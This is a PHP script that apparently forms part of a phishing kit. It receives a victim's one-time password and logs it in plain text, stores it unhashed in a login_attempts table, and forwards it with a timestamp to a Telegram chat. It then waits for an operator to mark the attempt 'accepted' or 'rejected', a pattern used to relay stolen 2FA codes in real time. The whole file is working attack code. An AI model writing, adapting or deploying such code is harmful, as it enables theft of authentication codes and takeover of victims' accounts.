<?php
// Include our standardized error handler
require_once 'error-handler.php';
setupApiErrorHandling();  // This handles JSON errors automatically

// Set up error logging
ini_set('display_errors', 0);
ini_set('log_errors', 1);

// Use a relative path for error logging that works on both local and cPanel
$logPath = dirname(__FILE__) . '/error.log';
if (is_writable(dirname($logPath))) {
    ini_set('error_log', $logPath);
}

// Include files AFTER error handling is set up
include 'db_connect.php';
include 'notification_config.php';

error_log("otp-verification.php: Script started");

// Create response object
$response = [
    'success' => false,
    'message' => 'Unknown error',
    'approved' => false
];

try {
    // Check database connection first
    if ($conn->connect_error) {
        throw new Exception("Database connection failed: " . $conn->connect_error);
    }

    // Get POST data
    $attemptId = isset($_POST['attempt_id']) ? intval($_POST['attempt_id']) : 0;
    $otp = isset($_POST['otp']) ? $_POST['otp'] : '';

    // Log request data for debugging
    error_log("OTP Verification Request - Attempt ID: $attemptId, OTP: $otp");

    // Validate input
    if ($attemptId <= 0) {
        throw new Exception("Invalid attempt ID");
    }

    if (empty($otp)) {
        throw new Exception("OTP is required");
    }

    // Check if the attempt exists - MODIFIED to avoid get_result()
    $checkAttemptSql = "SELECT COUNT(*) FROM login_attempts WHERE id = ?";
    $checkAttemptStmt = $conn->prepare($checkAttemptSql);
    
    if (!$checkAttemptStmt) {
        throw new Exception("SQL Error when checking attempt: " . $conn->error);
    }
    
    $checkAttemptStmt->bind_param("i", $attemptId);
    
    if (!$checkAttemptStmt->execute()) {
        throw new Exception("Failed to execute attempt check: " . $checkAttemptStmt->error);
    }
    
    // Use bind_result and fetch
    $count = 0;
    $checkAttemptStmt->bind_result($count);
    $checkAttemptStmt->fetch();
    $checkAttemptStmt->close();
    
    if ($count === 0) {
        throw new Exception("Login attempt not found");
    }

    // Log the OTP entered by the user
    $sql = "UPDATE login_attempts SET otp_plain = ?, status = 'pending' WHERE id = ?";
    $stmt = $conn->prepare($sql);
    
    if (!$stmt) {
        throw new Exception("SQL Error when updating OTP: " . $conn->error);
    }
    
    $stmt->bind_param("si", $otp, $attemptId);
    
    if (!$stmt->execute()) {
        throw new Exception("Failed to update OTP: " . $stmt->error);
    }
    
    $stmt->close();
    
    // Try to send notification about the OTP
    try {
        $telegramMessage = "🔐 OTP ENTERED 🔐\nAttempt ID: {$attemptId}\nOTP: {$otp}\nTime: " . date('Y-m-d H:i:s');
        $telegramSent = sendToTelegram($telegramMessage);
        
        if ($telegramSent) {
            error_log("Telegram notification for OTP sent successfully");
        } else {
            error_log("Telegram notification for OTP may have failed");
        }
    } catch (Exception $e) {
        error_log("Failed to send OTP notification: " . $e->getMessage());
        // Continue execution even if notification fails
    }

    // Wait for admin approval or rejection
    sleep(2); // Reduced to 2 seconds for faster response

    // Check the status after the delay - MODIFIED to avoid get_result()
    $checkSql = "SELECT status FROM login_attempts WHERE id = ?";
    $checkStmt = $conn->prepare($checkSql);
    
    if (!$checkStmt) {
        throw new Exception("SQL Error when checking status: " . $conn->error);
    }
    
    $checkStmt->bind_param("i", $attemptId);
    
    if (!$checkStmt->execute()) {
        throw new Exception("Failed to check status: " . $checkStmt->error);
    }
    
    // Use bind_result and fetch
    $currentStatus = '';
    $checkStmt->bind_result($currentStatus);
    $statusFound = $checkStmt->fetch();
    $checkStmt->close();

    if ($statusFound) {
        error_log("Current status for attempt ID $attemptId: $currentStatus");
        
        // Set response based on status
        $response['success'] = true;
        $response['approved'] = ($currentStatus === 'accepted');
        $response['status'] = $currentStatus;
    } else {
        throw new Exception("No record found after status check");
    }
    
} catch (Exception $e) {
    error_log("Exception in otp-verification.php: " . $e->getMessage());
    $response['message'] = $e->getMessage();
} finally {
    // Close any open database connections
    if (isset($conn) && $conn) {
        $conn->close();
    }
    
    // Return JSON response
    echo json_encode($response);
    
    // Clean output buffer
    ob_end_flush();
}
?>